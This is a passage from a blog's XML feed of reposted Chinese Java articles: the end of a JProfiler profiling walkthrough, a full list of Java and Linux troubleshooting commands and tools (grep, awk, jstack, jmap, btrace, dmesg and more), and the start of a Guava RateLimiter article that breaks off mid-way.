下的各个子视图展示了应用中各方法的执行次数、执行时间、调用关系等信息，能帮我们定位对应用性能影响最大的方法。</p><h4 id="Call-Tree"><a href="#Call-Tree" class="headerlink" title="Call Tree"></a>Call Tree</h4><p>Call tree 通过树形图清晰地展现了方法间的层次调用关系。同时，JProfiler 将子方法按照它们的执行总时间由大到小排序，这能让您快速定位关键方法。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/ab2a3583f98a67dc6920dff4481ebfea.png" alt="call_tree"></p><p>对于 Producer 而言，方法<code>SendProducerBatchTask.run()</code>耗时最多，继续向下查看会发现该方法的主要时间消耗在了执行方法<code>Client.PutLogs()</code>上。</p><h4 id="Hot-Spots"><a href="#Hot-Spots" class="headerlink" title="Hot Spots"></a>Hot Spots</h4><p>如果您的应用方法很多，且很多子方法的执行时间比较接近，使用 hot spots 视图往往能助您更快地定位问题。该视图能根据方法的单独执行时间、总执行时间、平均执行时间、调用次数等属性对它们排序。其中，单独执行时间等于该方法的总执行时间减去所有子方法的总执行时间。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/9e7f559b6ef3ddcc9bd6545a84be8180.png" alt="hot_spots"></p><p>在该视图下，可以看到<code>Client.PutLogs()</code>，<code>LogGroup.toByteArray()</code>，<code>SamplePerformance$1.run()</code>是单独执行时间耗时最多的三个方法。</p><h4 id="Call-Graph"><a href="#Call-Graph" class="headerlink" title="Call Graph"></a>Call Graph</h4><p>找到了关键方法后，call graph 视图能为您呈现与该方法直接关联的所有方法。这有助于我们对症下药，制定合适的性能优化策略。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/987805f20b4e07aa84fbc08e3b678826.png" alt="call_graph"></p><p>这里，我们观察到方法<code>Client.PutLogs()</code>执行的主要时间花费在了对象序列化上，因此性能优化的关键是提供执行效率更高的序列化方法。</p><h3 id="Live-memory"><a href="#Live-memory" class="headerlink" title="Live memory"></a>Live memory</h3><p>Live memory 下的各个子视图能让您掌握内存的具体分配和使用情况，助您判断是否存在内存泄漏问题。</p><h4 id="All-Objects"><a href="#All-Objects" class="headerlink" title="All Objects"></a>All Objects</h4><p>All Objects 视图展示了当前堆中各种对象的数量和总大小。由图可知，程序在运行过程中构造出了大量 LogContent 对象。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/ed722825e4dec3c7860187e25d11731d.png" alt="all_Objects"></p><h4 id="Allocation-Call-Tree"><a href="#Allocation-Call-Tree" class="headerlink" title="Allocation Call Tree"></a>Allocation Call Tree</h4><p>Allocation Call Tree 以树形图的形式展示了各方法分配的内存大小。可以看到，<code>SamplePerformance$1.run()</code>和<code>SendProducerBatchTask.run()</code>是内存分配大户。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/63a95f80732b8e78054988f5e550b7ec.png" alt="allocation_call_tree"></p><h4 id="Allocation-Hot-Spots"><a href="#Allocation-Hot-Spots" class="headerlink" title="Allocation Hot Spots"></a>Allocation Hot Spots</h4><p>如果方法比较多，您还可以通过 Allocation Hot Spots 视图快速找出分配对象最多的方法。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/7eb93e05da1be9d628df2716606a91dc.png" alt="allocation_hot_spots"></p><h3 id="Thread-History"><a href="#Thread-History" class="headerlink" title="Thread History"></a>Thread History</h3><p>线程历史记录视图直观地展示了各线程在不同时间点的状态。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/fc1440cdf7ef330717bfc57d879333bd.png" alt="thread_history"></p><p>不同线程执行的任务不同，所展现的状态特征也不同。</p><ul><li>线程<code>pool-1-thread-&lt;M&gt;</code>会循环调用<code>producer.send()</code>方法异步发送数据，它们在程序刚启动时一直处于运行状态，但随后在大部分时间里处于阻塞状态。这是因为 producer 发送数据的速率低于数据的产生速率，且单个 producer 实例能缓存的数据大小有限。在程序运行初始，producer 有足够空间缓存待发送数据，所以<code>pool-1-thread-&lt;M&gt;</code>一直处于运行状态，这也就解释了为何程序在刚启动时 CPU 使用率较高。随着时间的推移，producer 的缓存被逐渐耗尽，<code>pool-1-thread-&lt;M&gt;</code>必须等到 producer “释放”出足够的空间才有机会继续运行，这也是为什么我们会观察到大量线程处于阻塞状态。</li><li><code>aliyun-log-producer-0-mover</code>负责将超时 batch 投递到发送线程池中。由于发送速率较快，batch 会因缓存的数据达到了上限被<code>pool-1-thread-&lt;M&gt;</code>直接投递到发送线程池中，因此 mover 线程在大部分时间里都处于等待状态。</li><li><code>aliyun-log-producer-0-io-thread-&lt;N&gt;</code>作为真正执行数据发送任务的线程有一部分时间花在了网络 I/O 状态。</li><li><code>aliyun-log-producer-0-success-batch-handler</code>用于处理发送成功的 batch。由于回调函数比较简单，执行时间短，它在大部分时间里都处于等待状态。</li><li><code>aliyun-log-producer-0-failure-batch-handler</code>用于处理发送失败的 batch。由于没有数据发送失败，它一直处于等待状态。</li></ul><p>通过上述分析可知，这些线程的状态特征都是符合预期的。</p><h3 id="Overhead-Hot-Spots-Detected"><a href="#Overhead-Hot-Spots-Detected" class="headerlink" title="Overhead Hot Spots Detected"></a>Overhead Hot Spots Detected</h3><p>当程序运行结束后，JProfiler 会弹出一个对话框展示那些频繁被调用，但执行时间又很短的方法。在下次诊断时，您可以让 JProfiler agent 在分析过程中忽略掉这些方法以减轻对应用性能的影响。</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/0a297d77ecaf377b9aa57f020ed0594f.png" alt="overhead_hot_spots_detected"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>通过 JProfiler 的诊断可知应用不存在大的性能问题，也不存在内存泄漏。下一步的优化方向是提升对象的序列化效率。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://yq.aliyun.com/articles/276" target="_blank" rel="noopener">深入浅出JProfiler</a></li><li><a href="https://www.ej-technologies.com/resources/jprofiler/help/doc/#jprofiler.introduction" target="_blank" rel="noopener">Jprofiler Introduction</a></li></ul><p>本文转载自:  <a href="https://yq.aliyun.com/articles/684776?utm_content=g_1000035705" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 开发工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的java问题排查工具单</title>
      <link href="/2019/01/07/chang-yong-gong-ju/wo-de-java-wen-ti-pai-cha-gong-ju-dan/"/>
      <url>/2019/01/07/chang-yong-gong-ju/wo-de-java-wen-ti-pai-cha-gong-ju-dan/</url>
      
        <content type="html"><![CDATA[<h1 id="我的java问题排查工具单"><a href="#我的java问题排查工具单" class="headerlink" title="我的java问题排查工具单"></a>我的java问题排查工具单</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>平时的工作中经常碰到很多疑难问题的处理，在解决问题的同时，有一些工具起到了相当大的作用，在此书写下来，一是作为笔记，可以让自己后续忘记了可快速翻阅，二是分享，希望看到此文的同学们可以拿出自己日常觉得帮助很大的工具，大家一起进步。</p></blockquote><p>闲话不多说，开搞。</p><h2 id="Linux命令类"><a href="#Linux命令类" class="headerlink" title="Linux命令类"></a>Linux命令类</h2><h3 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h3><p>最常用的tail -f</p><pre class=" language-shell"><code class="language-shell">tail -300f shopbase.log #倒数300行并进入实时监听文件写入模式</code></pre><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><pre class=" language-shell"><code class="language-shell">grep forest f.txt     #文件查找grep forest f.txt cpf.txt #多文件查找grep 'log' /home/admin -r -n #目录下查找所有符合关键字的文件cat f.txt | grep -i shopbase    grep 'shopbase' /home/admin -r -n --include *.{vm,java} #指定文件后缀grep 'shopbase' /home/admin -r -n --exclude *.{vm,java} #反匹配seq 10 | grep 5 -A 3    #上匹配seq 10 | grep 5 -B 3    #下匹配seq 10 | grep 5 -C 3    #上下匹配，平时用这个就妥了cat f.txt | grep -c 'SHOPBASE'</code></pre><h3 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h3><p>1 基础命令</p><pre class=" language-shell"><code class="language-shell">awk '{print $4,$6}' f.txtawk '{print NR,$0}' f.txt cpf.txt    awk '{print FNR,$0}' f.txt cpf.txtawk '{print FNR,FILENAME,$0}' f.txt cpf.txtawk '{print FILENAME,"NR="NR,"FNR="FNR,"$"NF"="$NF}' f.txt cpf.txtecho 1:2:3:4 | awk -F: '{print $1,$2,$3,$4}'</code></pre><p>2 匹配</p><pre class=" language-shell"><code class="language-shell">awk '/ldb/ {print}' f.txt   #匹配ldbawk '!/ldb/ {print}' f.txt  #不匹配ldbawk '/ldb/ && /LISTEN/ {print}' f.txt   #匹配ldb和LISTENawk '$5 ~ /ldb/ {print}' f.txt #第五列匹配ldb</code></pre><p>3 内建变量</p><p>NR:NR表示从awk开始执行后，按照记录分隔符读取的数据次数，默认的记录分隔符为换行符，因此默认的就是读取的数据行数，NR可以理解为Number of Record的缩写。</p><p>FNR:在awk处理多个输入文件的时候，在处理完第一个文件后，NR并不会从1开始，而是继续累加，因此就出现了FNR，每当处理一个新文件的时候，FNR就从1开始计数，FNR可以理解为File Number of Record。</p><p>NF: NF表示目前的记录被分割的字段的数目，NF可以理解为Number of Field。</p><h3 id="find"><a href="#find" class="headerlink" title="find"></a>find</h3><pre class=" language-shell"><code class="language-shell">sudo -u admin find /home/admin /tmp /usr -name \*.log(多个目录去找)find . -iname \*.txt(大小写都匹配)find . -type d(当前目录下的所有子目录)find /usr -type l(当前目录下所有的符号链接)find /usr -type l -name "z*" -ls(符号链接的详细信息 eg:inode,目录)find /home/admin -size +250000k(超过250000k的文件，当然+改成-就是小于了)find /home/admin f -perm 777 -exec ls -l {} \; (按照权限查询文件)find /home/admin -atime -1  1天内访问过的文件find /home/admin -ctime -1  1天内状态改变过的文件    find /home/admin -mtime -1  1天内修改过的文件find /home/admin -amin -1  1分钟内访问过的文件find /home/admin -cmin -1  1分钟内状态改变过的文件    find /home/admin -mmin -1  1分钟内修改过的文件</code></pre><h3 id="pgm"><a href="#pgm" class="headerlink" title="pgm"></a>pgm</h3><p>批量查询vm-shopbase满足条件的日志</p><pre class=" language-shell"><code class="language-shell">pgm -A -f vm-shopbase 'cat /home/admin/shopbase/logs/shopbase.log.2017-01-17|grep 2069861630'</code></pre><h3 id="tsar"><a href="#tsar" class="headerlink" title="tsar"></a>tsar</h3><p>tsar是咱公司自己的采集工具。很好用, 将历史收集到的数据持久化在磁盘上，所以我们快速来查询历史的系统数据。当然实时的应用情况也是可以查询的啦。大部分机器上都有安装。</p><pre class=" language-shell"><code class="language-shell">tsar  ##可以查看最近一天的各项指标</code></pre><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/fc25b8f22e53818d5576c5d00dd52618.png" alt="screenshot.png"></p><pre class=" language-shell"><code class="language-shell">tsar --live ##可以查看实时指标，默认五秒一刷</code></pre><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/b68910c5416fd85a99a49a092fc9ffbb.png" alt="screenshot.png"></p><pre class=" language-shell"><code class="language-shell">tsar -d 20161218 ##指定查看某天的数据，貌似最多只能看四个月的数据</code></pre><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/aafdbfb515b817a2aceb270d1d470c19.png" alt="screenshot.png"></p><pre class=" language-shell"><code class="language-shell">tsar --memtsar --loadtsar --cpu##当然这个也可以和-d参数配合来查询某天的单个指标的情况 </code></pre><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/cb46ef4e374e1502d3b672d04d48099a.png" alt="screenshot.png"><br><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/079f3fa722bfa1991557469eb97c7273.png" alt="screenshot.png"><br><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/6dd77351ad4d1ad84cdbfba20c9d4c29.png" alt="screenshot.png"></p><h3 id="top"><a href="#top" class="headerlink" title="top"></a>top</h3><p>top除了看一些基本信息之外，剩下的就是配合来查询vm的各种问题了</p><pre class=" language-shell"><code class="language-shell">ps -ef | grep javatop -H -p pid</code></pre><p>获得线程10进制转16进制后jstack去抓看这个线程到底在干啥</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><pre class=" language-shell"><code class="language-shell">netstat -nat|awk  '{print $6}'|sort|uniq -c|sort -rn #查看当前连接，注意close_wait偏高的情况，比如如下</code></pre><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/250a027410775cf5990d0db6e87ba927.png" alt="screenshot.png"><br><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/639811da529750064e2f70867d6234e0.png" alt="screenshot.png"></p><h2 id="排查利器"><a href="#排查利器" class="headerlink" title="排查利器"></a>排查利器</h2><h3 id="btrace"><a href="#btrace" class="headerlink" title="btrace"></a>btrace</h3><p>首当其冲的要说的是btrace。真是生产环境&amp;预发的排查问题大杀器。 简介什么的就不说了。直接上代码干</p><ol><li><p>查看当前谁调用了ArrayList的add方法，同时只打印当前ArrayList的size大于500的线程调用栈</p><p>@OnMethod(clazz = “java.util.ArrayList”, method=”add”, location = @Location(value = Kind.CALL, clazz = “/.<em>/“, method = “/.</em>/“))<br>public static void m(@ProbeClassName String probeClass, @ProbeMethodName String probeMethod, @TargetInstance Object instance, @TargetMethodOrField String method) {</p><pre class=" language-shell"><code class="language-shell">if(getInt(field("java.util.ArrayList", "size"), instance) > 479){    println("check who ArrayList.add method:" + probeClass + "#" + probeMethod  + ", method:" + method + ", size:" + getInt(field("java.util.ArrayList", "size"), instance));    jstack();    println();    println("===========================");    println();}</code></pre><p>}</p></li><li><p>监控当前服务方法被调用时返回的值以及请求的参数</p><p>@OnMethod(clazz = “com.taobao.sellerhome.transfer.biz.impl.C2CApplyerServiceImpl”, method=”nav”, location = @Location(value = Kind.RETURN))<br>public static void mt(long userId, int current, int relation, String check, String redirectUrl, @Return AnyType result) {</p><pre class=" language-shell"><code class="language-shell">    println("parameter# userId:" + userId + ", current:" + current + ", relation:" + relation + ", check:" + check + ", redirectUrl:" + redirectUrl + ", result:" + result);</code></pre><p>}</p></li></ol><p>其他功能集团的一些工具或多或少都有，就不说了。感兴趣的请移步。<br><a href="https://github.com/btraceio/btrace?spm=a2c4e.11153940.blogcont69520.11.6a5c2c31VO25tO">https://github.com/btraceio/btrace</a></p><p>注意:</p><ol><li>经过观察，1.3.9的release输出不稳定，要多触发几次才能看到正确的结果</li><li>正则表达式匹配trace类时范围一定要控制，否则极有可能出现跑满CPU导致应用卡死的情况</li><li>由于是字节码注入的原理，想要应用恢复到正常情况，需要重启应用。</li></ol><h3 id="Greys"><a href="#Greys" class="headerlink" title="Greys"></a>Greys</h3><p>Greys是@杜琨的大作吧。说几个挺棒的功能(部分功能和btrace重合):</p><p><code>sc -df xxx</code>: 输出当前类的详情,包括源码位置和classloader结构</p><p><code>trace class method</code>: 相当喜欢这个功能! 很早前可以早JProfiler看到这个功能。打印出当前方法调用的耗时情况，细分到每个方法。对排查方法性能时很有帮助，比如我之前这篇就是使用了trace命令来的:<a href="http://www.atatech.org/articles/52947" target="_blank" rel="noopener">http://www.atatech.org/articles/52947</a>。</p><p>其他功能部分和btrace重合，可以选用，感兴趣的请移步。<br><a href="http://www.atatech.org/articles/26247" target="_blank" rel="noopener">http://www.atatech.org/articles/26247</a></p><p>另外相关联的是arthas，他是基于Greys的，感兴趣的再移步<a href="http://mw.alibaba-inc.com/products/arthas/docs/middleware-container/arthas.wiki/home.html?spm=a1z9z.8109794.header.32.1lsoMc" target="_blank" rel="noopener">http://mw.alibaba-inc.com/products/arthas/docs/middleware-container/arthas.wiki/home.html?spm=a1z9z.8109794.header.32.1lsoMc</a></p><h3 id="javOSize"><a href="#javOSize" class="headerlink" title="javOSize"></a>javOSize</h3><p>就说一个功能<br><code>classes</code>：通过修改了字节码，改变了类的内容，即时生效。 所以可以做到快速的在某个地方打个日志看看输出，缺点是对代码的侵入性太大。但是如果自己知道自己在干嘛，的确是不错的玩意儿。</p><p>其他功能Greys和btrace都能很轻易做的到，不说了。</p><p>可以看看我之前写的一篇javOSize的简介<a href="http://www.atatech.org/articles/38546" target="_blank" rel="noopener">http://www.atatech.org/articles/38546</a><br>官网请移步<a href="http://www.javosize.com/" target="_blank" rel="noopener">http://www.javosize.com/</a></p><h3 id="JProfiler"><a href="#JProfiler" class="headerlink" title="JProfiler"></a>JProfiler</h3><p>之前判断许多问题要通过JProfiler，但是现在Greys和btrace基本都能搞定了。再加上出问题的基本上都是生产环境(网络隔离)，所以基本不怎么使用了，但是还是要标记一下。<br>官网请移步<a href="https://www.ej-technologies.com/products/jprofiler/overview.html" target="_blank" rel="noopener">https://www.ej-technologies.com/products/jprofiler/overview.html</a></p><h2 id="大杀器"><a href="#大杀器" class="headerlink" title="大杀器"></a>大杀器</h2><h3 id="eclipseMAT"><a href="#eclipseMAT" class="headerlink" title="eclipseMAT"></a>eclipseMAT</h3><p>可作为eclipse的插件，也可作为单独的程序打开。<br>详情请移步<a href="http://www.eclipse.org/mat/" target="_blank" rel="noopener">http://www.eclipse.org/mat/</a></p><h3 id="zprofiler"><a href="#zprofiler" class="headerlink" title="zprofiler"></a>zprofiler</h3><p>集团内的开发应该是无人不知无人不晓了。简而言之一句话:有了zprofiler还要mat干嘛<br>详情请移步<a href="http://zprofiler.alibaba-inc.com/" target="_blank" rel="noopener">zprofiler.alibaba-inc.com</a></p><h2 id="java七武器"><a href="#java七武器" class="headerlink" title="java七武器"></a>java七武器</h2><h3 id="jps"><a href="#jps" class="headerlink" title="jps"></a>jps</h3><p>我只用一条命令：</p><pre class=" language-shell"><code class="language-shell">sudo -u admin /opt/taobao/java/bin/jps -mlvV</code></pre><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/7b156cb53250bf5f91811900c2575a91.png" alt="screenshot.png"></p><h3 id="jstack"><a href="#jstack" class="headerlink" title="jstack"></a>jstack</h3><p>普通用法:</p><pre class=" language-shell"><code class="language-shell">sudo -u admin /opt/taobao/install/ajdk-8_1_1_fp1-b52/bin/jstack 2815</code></pre><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/bc501bf424b3d2884e6ec118d14554a3.png" alt="screenshot.png"></p><p>native+java栈:</p><pre class=" language-shell"><code class="language-shell">sudo -u admin /opt/taobao/install/ajdk-8_1_1_fp1-b52/bin/jstack -m 2815</code></pre><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/4c59dc2971f3d8778e1898d64266266a.png" alt="screenshot.png"></p><h3 id="jinfo"><a href="#jinfo" class="headerlink" title="jinfo"></a>jinfo</h3><p>可看系统启动的参数，如下</p><pre class=" language-shell"><code class="language-shell">sudo -u admin /opt/taobao/install/ajdk-8_1_1_fp1-b52/bin/jinfo -flags 2815</code></pre><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/bc879145e2994e9a09327407ed88382c.png" alt="screenshot.png"></p><h3 id="jmap"><a href="#jmap" class="headerlink" title="jmap"></a>jmap</h3><p>两个用途</p><p>1.查看堆的情况</p><pre class=" language-shell"><code class="language-shell">sudo -u admin /opt/taobao/install/ajdk-8_1_1_fp1-b52/bin/jmap -heap 2815</code></pre><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/00d9eaef08cdb51263d202d26795036b.png" alt="screenshot.png"><br><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/3c08bccf81fef8b7bcae2b321012b503.png" alt="screenshot.png"></p><p>2.dump</p><pre class=" language-shell"><code class="language-shell">sudo -u admin /opt/taobao/install/ajdk-8_1_1_fp1-b52/bin/jmap -dump:live,format=b,file=/tmp/heap2.bin 2815</code></pre><p>或者</p><pre class=" language-shell"><code class="language-shell">sudo -u admin /opt/taobao/install/ajdk-8_1_1_fp1-b52/bin/jmap -dump:format=b,file=/tmp/heap3.bin 2815</code></pre><p>3.看看堆都被谁占了? 再配合zprofiler和btrace，排查问题简直是如虎添翼</p><pre class=" language-shell"><code class="language-shell">sudo -u admin /opt/taobao/install/ajdk-8_1_1_fp1-b52/bin/jmap -histo 2815 | head -10</code></pre><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/500ec6709fcd03a4fca2679615d54522.png" alt="screenshot.png"></p><h3 id="jstat"><a href="#jstat" class="headerlink" title="jstat"></a>jstat</h3><p>jstat参数众多，但是使用一个就够了</p><pre class=" language-shell"><code class="language-shell">sudo -u admin /opt/taobao/install/ajdk-8_1_1_fp1-b52/bin/jstat -gcutil 2815 1000 </code></pre><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/05743916a9187535c202fb410d30d50d.png" alt="screenshot.png"></p><h3 id="jdb"><a href="#jdb" class="headerlink" title="jdb"></a>jdb</h3><p>时至今日，jdb也是经常使用的。<br>jdb可以用来预发debug,假设你预发的java_home是/opt/taobao/java/，远程调试端口是8000.那么<br><code>sudo -u admin /opt/taobao/java/bin/jdb -attach 8000</code>.</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/16332fcd45b20137bffc7a3b9a88b0f1.png" alt="screenshot.png"></p><p>出现以上代表jdb启动成功。后续可以进行设置断点进行调试。<br>具体参数可见oracle官方说明<a href="http://docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html" target="_blank" rel="noopener">http://docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html</a></p><h3 id="CHLSDB"><a href="#CHLSDB" class="headerlink" title="CHLSDB"></a>CHLSDB</h3><p>CHLSDB感觉很多情况下可以看到更好玩的东西，不详细叙述了。 查询资料听说jstack和jmap等工具就是基于它的。</p><pre class=" language-shell"><code class="language-shell">sudo -u admin /opt/taobao/java/bin/java -classpath /opt/taobao/java/lib/sa-jdi.jar sun.jvm.hotspot.CLHSDB</code></pre><p>更详细的可见R大此贴<br><a href="http://rednaxelafx.iteye.com/blog/1847971" target="_blank" rel="noopener">http://rednaxelafx.iteye.com/blog/1847971</a></p><h2 id="plugin-of-intellij-idea"><a href="#plugin-of-intellij-idea" class="headerlink" title="plugin of intellij idea"></a>plugin of intellij idea</h2><h3 id="key-promoter"><a href="#key-promoter" class="headerlink" title="key promoter"></a>key promoter</h3><p>快捷键一次你记不住，多来几次你总能记住了吧？</p><p><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/356c11885a95e28736a605aecdc8083e.png" alt="screenshot.png"></p><h3 id="maven-helper"><a href="#maven-helper" class="headerlink" title="maven helper"></a>maven helper</h3><p>分析maven依赖的好帮手。</p><h2 id="VM-options"><a href="#VM-options" class="headerlink" title="VM options"></a>VM options</h2><ol><li><p>你的类到底是从哪个文件加载进来的？</p><pre class=" language-shell"><code class="language-shell">-XX:+TraceClassLoading结果形如[Loaded java.lang.invoke.MethodHandleImpl$Lazy from D:\programme\jdk\jdk8U74\jre\lib\rt.jar]</code></pre></li><li><p>应用挂了输出dump文件</p><pre class=" language-shell"><code class="language-shell">-XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/home/admin/logs/java.hprof集团的vm参数里边基本都有这个选项</code></pre></li></ol><h2 id="jar包冲突"><a href="#jar包冲突" class="headerlink" title="jar包冲突"></a>jar包冲突</h2><p>把这个单独写个大标题不过分吧？每个人或多或少都处理过这种烦人的case。我特么下边这么多方案不信就搞不定你?</p><pre class=" language-shell"><code class="language-shell">mvn dependency:tree > ~/dependency.txt</code></pre><p>打出所有依赖</p><pre class=" language-shell"><code class="language-shell">mvn dependency:tree -Dverbose -Dincludes=groupId:artifactId</code></pre><p>只打出指定groupId和artifactId的依赖关系</p><h3 id="XX-TraceClassLoading"><a href="#XX-TraceClassLoading" class="headerlink" title="-XX:+TraceClassLoading"></a>-XX:+TraceClassLoading</h3><p>vm启动脚本加入。在tomcat启动脚本中可见加载类的详细信息</p><h3 id="verbose"><a href="#verbose" class="headerlink" title="-verbose"></a>-verbose</h3><p>vm启动脚本加入。在tomcat启动脚本中可见加载类的详细信息</p><h3 id="greys-sc"><a href="#greys-sc" class="headerlink" title="greys:sc"></a>greys:sc</h3><p>greys的sc命令也能清晰的看到当前类是从哪里加载过来的</p><h3 id="tomcat-classloader-locate"><a href="#tomcat-classloader-locate" class="headerlink" title="tomcat-classloader-locate"></a>tomcat-classloader-locate</h3><p>通过以下url可以获知当前类是从哪里加载的</p><p>curl &lt;<a href="http://localhost:8006/classloader/locate?class=org.apache.xerces.xs.XSObject" target="_blank" rel="noopener">http://localhost:8006/classloader/locate?class=org.apache.xerces.xs.XSObject</a></p><h2 id="ALI-TOMCAT带给我们的惊喜-感谢-务观"><a href="#ALI-TOMCAT带给我们的惊喜-感谢-务观" class="headerlink" title="ALI-TOMCAT带给我们的惊喜(感谢@务观)"></a>ALI-TOMCAT带给我们的惊喜(感谢@务观)</h2><ol><li><p>列出容器加载的jar列表</p><p>curl <a href="http://localhost:8006/classloader/jars" target="_blank" rel="noopener">http://localhost:8006/classloader/jars</a></p></li><li><p>列出当前当当前类加载的实际jar包位置，解决类冲突时有用</p><p>curl <a href="http://localhost:8006/classloader/locate?class=org.apache.xerces.xs.XSObject" target="_blank" rel="noopener">http://localhost:8006/classloader/locate?class=org.apache.xerces.xs.XSObject</a><br><img src="http://ata2-img.cn-hangzhou.img-pub.aliyun-inc.com/4568b16d3db0daf98e852412b830f1a8.png" alt="screenshot.png"></p></li></ol><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><h3 id="gpref"><a href="#gpref" class="headerlink" title="gpref"></a>gpref</h3><p><a href="http://www.atatech.org/articles/33317" target="_blank" rel="noopener">http://www.atatech.org/articles/33317</a></p><h3 id="dmesg"><a href="#dmesg" class="headerlink" title="dmesg"></a>dmesg</h3><p>如果发现自己的java进程悄无声息的消失了，几乎没有留下任何线索，那么dmesg一发，很有可能有你想要的。</p><pre class=" language-shell"><code class="language-shell">sudo dmesg|grep -i kill|less</code></pre><p>去找关键字oom_killer。找到的结果类似如下:</p><pre class=" language-shell"><code class="language-shell">[6710782.021013] java invoked oom-killer: gfp_mask=0xd0, order=0, oom_adj=0, oom_scoe_adj=0[6710782.070639] [<ffffffff81118898>] ? oom_kill_process+0x68/0x140 [6710782.257588] Task in /LXC011175068174 killed as a result of limit of /LXC011175068174 [6710784.698347] Memory cgroup out of memory: Kill process 215701 (java) score 854 or sacrifice child [6710784.707978] Killed process 215701, UID 679, (java) total-vm:11017300kB, anon-rss:7152432kB, file-rss:1232kB</code></pre><p>以上表明，对应的java进程被系统的OOM Killer给干掉了，得分为854.<br>解释一下OOM killer（Out-Of-Memory killer），该机制会监控机器的内存资源消耗。当机器内存耗尽前，该机制会扫描所有的进程（按照一定规则计算，内存占用，时间等），挑选出得分最高的进程，然后杀死，从而保护机器。</p><p>dmesg日志时间转换公式:<br>log实际时间=格林威治1970-01-01+(当前时间秒数-系统启动至今的秒数+dmesg打印的log时间)秒数：</p><pre class=" language-shell"><code class="language-shell">date -d "1970-01-01 UTC `echo "$(date +%s)-$(cat /proc/uptime|cut -f 1 -d' ')+12288812.926194"|bc ` seconds"</code></pre><p>剩下的，就是看看为什么内存这么大，触发了OOM-Killer了。</p><h2 id="新技能get"><a href="#新技能get" class="headerlink" title="新技能get"></a>新技能get</h2><h3 id="RateLimiter"><a href="#RateLimiter" class="headerlink" title="RateLimiter"></a>RateLimiter</h3><p>想要精细的控制QPS? 比如这样一个场景，你调用某个接口，对方明确需要你限制你的QPS在400之内你怎么控制？这个时候RateLimiter就有了用武之地。详情可移步<a href="http://ifeve.com/guava-ratelimiter/?spm=a2c4e.11153940.blogcont69520.26.6a5c2c31VO25tO" target="_blank" rel="noopener">http://ifeve.com/guava-ratelimiter/</a></p><p>本文转载自:  <a href="https://yq.aliyun.com/articles/69520?utm_content=m_10360" target="_blank" rel="noopener">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 开发工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Guava的RateLimiter做限流</title>
      <link href="/2019/01/07/java/shi-yong-guava-de-ratelimiter-zuo-xian-liu/"/>
      <url>/2019/01/07/java/shi-yong-guava-de-ratelimiter-zuo-xian-liu/</url>
      
        <content type="html"><![CDATA[<h1 id="使用Guava的RateLimiter做限流"><a href="#使用Guava的RateLimiter做限流" class="headerlink" title="使用Guava的RateLimiter做限流"></a>使用Guava的RateLimiter做限流</h1><h2 id="一、常见的限流算法"><a href="#一、常见的限流算法" class="headerlink" title="一、常见的限流算法"></a>一、常见的限流算法</h2><p>目前常用的限流算法有两个：漏桶算法和令牌桶算法。</p><h3 id="1-漏桶算法"><a href="#1-漏桶算法" class="headerlink" title="1.漏桶算法"></a>1.漏桶算法</h3><p>漏桶算法的原理比较简单，请求进入到漏桶中，漏桶以一定的速率漏水。当请求过多时，水直接溢出。可以看出，漏桶算法可以强制限制数据的传输速度。</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/java/081225378155003.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/java/081225378155003.png" alt="img"></a></p><h3 id="2-令牌桶算法"><a href="#2-令牌桶算法" class="headerlink" 